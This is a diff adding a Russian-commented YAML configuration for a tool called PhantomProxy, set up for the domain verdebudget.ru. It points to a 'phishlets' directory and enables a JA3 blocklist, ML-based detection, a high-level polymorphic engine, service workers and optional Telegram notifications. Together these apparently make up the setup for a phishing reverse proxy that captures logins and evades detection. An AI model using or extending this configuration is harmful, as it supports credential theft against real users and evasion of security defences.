@@ -1,0 +1,52 @@
+# PhantomProxy Configuration для verdebudget.ru
+# Тестовая конфигурация
+
+# Сеть
+bind_ip: "0.0.0.0"
+https_port: 8443  # Порт 8443 для теста (не требует админа)
+http3_port: 8443
+http3_enabled: true
+
+# Домен и сертификаты
+domain: "verdebudget.ru"
+auto_cert: false
+cert_path: "./certs/cert.pem"
+key_path: "./certs/key.pem"
+
+# База данных
+database_path: "./phantom.db"
+database_type: "sqlite"
+
+# Phishlets
+phishlets_path: "./configs/phishlets"
+
+# Безопасность
+ja3_enabled: true
+ja3_blocklist: []
+ml_detection: true
+ml_threshold: 0.75
+
+# Polymorphic engine
+polymorphic_enabled: true
+polymorphic_level: "high"
+
+# Service Worker
+serviceworker_enabled: true
+
+# WebSocket
+websocket_enabled: true
+
+# Уведомления (раскомментируйте для включения)
+telegram_enabled: false
+# telegram_token: "YOUR_BOT_TOKEN"
+# telegram_chat_id: 123456789
+
+# API
+api_enabled: true
+api_port: 8080
+api_key: "verdebudget-secret-key-change-me"
+
+# Логирование
+debug: true
+log_path: "./logs/phantom.log"
+log_level: "debug"
